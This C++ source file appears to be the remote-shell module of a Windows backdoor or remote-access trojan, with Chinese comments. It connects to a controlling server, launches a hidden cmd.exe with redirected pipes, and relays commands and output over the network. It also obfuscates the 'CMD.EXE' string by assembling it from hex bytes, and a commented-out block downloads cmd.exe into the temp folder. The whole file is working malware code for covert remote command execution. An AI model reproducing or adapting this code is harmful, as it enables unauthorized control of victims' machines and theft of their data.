// MyTlntTrans.cpp: implementation of the CMyTlntTrans class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "MyTlntTrans.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CMyTlntTrans::CMyTlntTrans()
{
	hChildStdinRd = 0;
	hChildStdinWr = 0;
	hChildStdinWrDup = 0;
	hChildStdoutRd = 0;
	hChildStdoutWr = 0;
	hChildStdoutRdDup = 0;
	hSaveStdin = 0;
	hSaveStdout = 0;  
	hProcess = 0;
	ZeroMemory(m_CmdFilePath, 256);

	pSendBuf = new char[8 * 1024 * 1024];
}

CMyTlntTrans::~CMyTlntTrans()
{
	delete [] pSendBuf;
}

UINT CMyTlntTrans::ReadLine(char* pReadBuf)
{
	UINT nReadCount = 0;
	DWORD dwRead = 0;
	char ch = 0;
	int nCount = 0;
	DWORD dMaxLen = 8 * 1024 * 1024 - 256;
	while(nReadCount <= dMaxLen)
	{
		if(!ReadFile(hChildStdoutRdDup, &ch, 1, &dwRead, NULL) || dwRead == 0) 
		{
			return 0; 
		}
		pReadBuf[nReadCount] = ch;
		if(ch == '>')
		{
			nReadCount ++;
			if((nReadCount >= 5 &&
				pReadBuf[nReadCount - 1] == '>' &&
				pReadBuf[nReadCount - 2] == 'R' &&
				pReadBuf[nReadCount - 3] == 'I' &&
				pReadBuf[nReadCount - 4] == 'D' &&
				pReadBuf[nReadCount - 5] == '<'))
			{
				if(nCount++ < 80)
				{
					continue;
				}
			}
			break;
		}
		nReadCount ++;
	}
	return nReadCount;
}

void CMyTlntTrans::SendCmd()
{
	//开始发送数据
	DWORD dwRead = 0;
	while(1) 
	{ 
		dwRead = ReadLine(pSendBuf);
		if(dwRead == 0)
		{
			break;
		}

		if(!SendDataWithCmd(pSendBuf, dwRead, 0))
		{
			break;
		}
	}
	Close();
}

void CMyTlntTrans::SendCmdThread(LPVOID lPvoid)
{
	CMyTlntTrans* pThis = (CMyTlntTrans*) lPvoid;
	pThis->SendCmd();
}

//控制线程
void CMyTlntTrans::StartWork(PSDLLINFO m_DllInfo)
{
	//连接到服务器
	if(!Create(WM_CONNECT_TLNT, m_DllInfo))
	{
		return;
	}
/*
	//CMD.EXE
	char m_TmpStr[256] = {0};
	m_TmpStr[0] = '%';
	m_TmpStr[1] = 's';
	m_TmpStr[2] = '.';
	m_TmpStr[3] = 'e';
	m_TmpStr[4] = 'x';
	m_TmpStr[5] = 'e';
	m_TmpStr[6] = 0;
	GetTempPath(250, m_CmdFilePath);
	wsprintf(m_CmdFilePath + lstrlen(m_CmdFilePath), m_TmpStr, m_DllInfo.m_ServiceName);

	//下载cmd.exe
	if(!MyMainFunc::GetMyFile(m_CmdFilePath, WM_CONNECT_CMD, m_DllInfo))
	{
		return;
	}
*/
	//创建进程,重定向
	if(CreateShellRedirect())
	{
		HANDLE hThread = (HANDLE) _beginthread(SendCmdThread, 0, (LPVOID) this);

		DWORD dwRead = 0;
		DWORD dwBytesWritten = 0;
		DWORD nCmd = 0;
		BYTE* pRecvBuf = NULL;
		while(1)
		{
			if(pRecvBuf != NULL)
			{
				delete [] pRecvBuf;
				pRecvBuf = NULL;
			}

			//与主机通信
			if(!RecvDataWithCmd(&pRecvBuf, &dwRead, &nCmd))
			{
				break;
			}

			//自定义命令

			//发送命令到终端
			if(dwRead != 0)
			{
				WriteFile(hChildStdinWrDup, pRecvBuf, dwRead, &dwBytesWritten, NULL);
			}
		}
		Close();

		if(pRecvBuf != NULL)
		{
			delete [] pRecvBuf;
		}

		if(hChildStdinRd != NULL)
		{
			hChildStdinRd = NULL;
			CloseHandle(hChildStdinRd);
		}
		if(hChildStdoutWr != NULL)
		{
			hChildStdoutWr = NULL;
			CloseHandle(hChildStdoutWr);
		}
		if(hChildStdinWrDup != NULL)
		{
			hChildStdinWrDup = NULL;
			CloseHandle(hChildStdinWrDup);
		}
		if(hChildStdoutRdDup != NULL)
		{
			hChildStdoutRdDup = NULL;
			CloseHandle(hChildStdoutRdDup);
		}
		TerminateProcess(hProcess, 0);
	}
}

BOOL CMyTlntTrans::CreateShellRedirect()
{
	SECURITY_ATTRIBUTES saAttr;
	BOOL fSuccess;

	// Set the bInheritHandle flag so pipe handles are inherited.
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;
	hSaveStdout = GetStdHandle(STD_OUTPUT_HANDLE);  
	
	if(!CreatePipe(&hChildStdoutRd, &hChildStdoutWr, &saAttr, 0))
	{
		return FALSE;
	}

	if(!SetStdHandle(STD_OUTPUT_HANDLE, hChildStdoutWr))
	{
		return FALSE;
	}
   
    fSuccess = DuplicateHandle(GetCurrentProcess(), hChildStdoutRd,
        GetCurrentProcess(), &hChildStdoutRdDup , 0,  FALSE, DUPLICATE_SAME_ACCESS );
	if(!fSuccess)
	{
      return FALSE;
	}
	CloseHandle(hChildStdoutRd);
	
	hSaveStdin = GetStdHandle(STD_INPUT_HANDLE);  

	// Create a pipe for the child process's STDIN.  
	if(!CreatePipe(&hChildStdinRd, &hChildStdinWr, &saAttr, 0) || !SetStdHandle(STD_INPUT_HANDLE, hChildStdinRd))
	{
		return FALSE;
	}

	// Duplicate the write handle to the pipe so it is not inherited.  
	fSuccess = DuplicateHandle(GetCurrentProcess(), hChildStdinWr, 
		GetCurrentProcess(), &hChildStdinWrDup, 0, FALSE, DUPLICATE_SAME_ACCESS ); 
	if(!fSuccess ) 
	{
		return FALSE;
	}
	CloseHandle(hChildStdinWr);

	if(!CreateChildProcessNoLogin())
	{
		return FALSE;
	}

	if(!SetStdHandle(STD_INPUT_HANDLE, hSaveStdin) || !SetStdHandle(STD_OUTPUT_HANDLE, hSaveStdout))
	{
		return FALSE;
	}
	return TRUE;
}

BOOL CMyTlntTrans::CreateChildProcessNoLogin()
{
	/*CMD.EXE*/
	m_CmdFilePath[0] = (char) 0x43;
	m_CmdFilePath[1] = (char) 0x4d;
	m_CmdFilePath[2] = (char) 0x44;
	m_CmdFilePath[3] = (char) 0x2e;
	m_CmdFilePath[4] = (char) 0x45;
	m_CmdFilePath[5] = (char) 0x58;
	m_CmdFilePath[6] = (char) 0x45;
	m_CmdFilePath[7] = 0x00;

	PROCESS_INFORMATION piProcInfo;
	STARTUPINFOA siStartInfo;  
	ZeroMemory(&siStartInfo, sizeof(STARTUPINFOA));
	siStartInfo.cb = sizeof(STARTUPINFOA);
	siStartInfo.lpReserved = NULL;
	siStartInfo.lpReserved2 = NULL;
	siStartInfo.cbReserved2 = 0;
	siStartInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	siStartInfo.hStdInput = hChildStdinRd;
	siStartInfo.hStdOutput = hChildStdoutWr;
	siStartInfo.hStdError = hChildStdoutWr;
	siStartInfo.wShowWindow = SW_HIDE;
	if(!CreateProcess(NULL,
			m_CmdFilePath,       
			NULL,          
			NULL,          
			TRUE,          
			CREATE_NO_WINDOW, 
			NULL,         
			NULL,         
			&siStartInfo, 
			&piProcInfo))
	{
		return FALSE;
	}
	hProcess = piProcInfo.hProcess ;
	return TRUE;
}

